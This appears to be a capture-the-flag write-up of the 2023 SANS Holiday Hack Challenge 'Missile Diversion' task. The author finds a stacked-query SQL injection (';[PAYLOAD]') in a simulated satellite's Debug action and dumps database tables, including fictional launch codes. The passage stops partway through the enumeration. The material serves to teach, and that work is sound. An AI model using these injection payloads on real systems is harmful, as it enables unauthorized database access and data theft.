# Writeup for The 2023 SANS Holiday Hack Challenge: A Holiday Odyssey \| Featuring 6: Geese A-Lei'ing!
## Missile Diversion
Difficulty: :christmas_tree::christmas_tree::christmas_tree::christmas_tree::christmas_tree:  
Thwart Jack's evil plan by re-aiming his missile at the Sun.

### Solution
Re-utilizing the same environment from before, I used the `Consumer Test Tool` to connect to `maltcp://10.1.1.1:1024/nanosat-mo-supervisor-Directory`, start the `missile-targeting-system`, and then connecting to `maltcp://10.1.1.1:1026/missile-targeting-system-Directory`. This exposes the `Debug` Action Service along with 4 Parameter Services: `PointingMode`, returning the current pointing mode, `X` and `Y`, returning the coordinates, and `Debug`, returning the last output from the `Debug` Action Service. Trying to set `X`, `Y` and `PointingMode` was not giving any result. I then tried submitting the `Debug` Action without any input and the `Debug` Parameter Service returned the string `VERSION(): 11.2.2-MariaDB-1:11.2.2+maria~ubu2204`, clearly identifying the interaction with a DB. I tested the action service for common SQL injection by using the attribute value to inject the payload, eventually finding `;[PAYLOAD]` as a resilient injection pattern. I then enumerated the tables in the database and their content:
| QUERY | RESULTS |
| - | - |
| ; SELECT * FROM pointing_mode_to_str | id: 1 \| numerical_mode: 0 \| str_mode: Earth Point Mode \| str_desc: When pointing_mode is 0, targeting system applies the target_coordinates to earth.
id: 2 \| numerical_mode: 1 \| str_mode: Sun Point Mode \| str_desc: When pointing_mode is 1, targeting system points at the sun, ignoring the coordinates. \| |
| ; SELECT * FROM user_variables | java.sql.SQLSyntaxErrorException: (conn-3488) SELECT command denied to user 'targeter @'172.18.0.4' for table missile_targeting system. 'user_variables |
| ; SELECT * FROM messaging | id: 1 \| msg_type: RedAlphaMsg \| msg_data: RONCTTLA \|
id: 2 \| msg_type: MsgAuth \| msg_data: 220040DL \|
11.2.2-MariaDB-1:11.2.2+maria-ubu2204 \|
id: 3 msg_type: LaunchCode \| msg_data: DLG2209TVX \|
id: 4 \| msg_type: LaunchOrder \| msg_data: CONFIRMED
id: 5 \| msg_type: TargetSelection \| msg_data: CONFIRMED
id: 6 \| msg_type: TimeOnTargetSequence \| msg_data: COMPLETE \|
id: 7 \| msg_type: YieldSelection \| msg_data: COMPLETE \|
id: 8 \| msg_type: MissileDownlink \| msg_data: ONLINE \|
id: 9 \| msg_type: TargetDownlinked \| msg_data: FALSE \| |
| ; SELECT * FROM pointing_mode | id: 1 \| numerical_mode: 0 \| |
| ; SELECT * FROM target_coordinates | id: 1 lat: 1.14514 \| Ing: -145.262 \| |
| ; SELECT * FROM satellite_query | jid: 1 \| object: ........sr..SatelliteQueryFileFolderUtility.......................Z..isQueryZ..isUpdateL..pathOrStatementt..Ljava/lang/String;xp..t.)/opt/SatelliteQueryFileFolderUtility.java \| results: import java.io.Serializable;
# Output removed to shorten report
public class SatelliteQueryFileFolderUtility implements Serializable {
# Output removed to shorten report |


